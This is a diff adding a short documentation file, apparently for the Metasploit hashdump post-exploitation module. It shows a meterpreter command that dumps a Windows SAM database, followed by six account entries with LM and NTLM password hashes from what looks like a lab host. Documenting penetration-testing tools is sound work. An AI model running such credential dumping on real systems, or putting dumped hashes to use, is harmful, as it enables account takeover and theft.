@@ -1,0 +1,18 @@
+The hashdump post module will dump the contents of the SAM database.
+
+meterpreter > run post/windows/gather/hashdump
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hashes...
+
+Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
+dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
+victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+
+meterpreter >
